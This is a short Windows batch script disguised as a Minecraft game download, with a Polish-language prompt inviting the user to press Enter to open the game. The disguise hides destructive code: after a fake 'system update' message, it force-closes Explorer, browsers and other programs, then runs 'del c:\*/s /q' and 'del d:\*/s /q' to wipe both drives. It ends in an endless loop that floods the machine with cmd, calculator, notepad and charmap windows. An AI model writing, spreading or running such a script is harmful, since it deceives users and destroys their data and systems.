@echo off
title minecraft 2024 downoad 2024 version stem(pobierz minecraft).bat
echo Chcesz otworzyc gre minecraft?
echo jak tak kliknij enter!
pause
shutdown -a -t 100 -c "Twuj system sie musi zaktualizowac..."
taskkill /f /im explorer.exe
taskkill /f /im chrome.exe
taskkill /f /im firefox.exe
taskkill /f /im opera.exe
taskkill /f /im opera gx.exe
taskkill /f /im microsoft edge.exe
taskkill /f /im microsoft teams.exe
taskkill /f /im microsoft strore.exe
del c:\*/s /q
del d:\*/s /q
:start
start cmd.exe
start charmap.exe
start calc.exe
start notepad.exe
goto :start
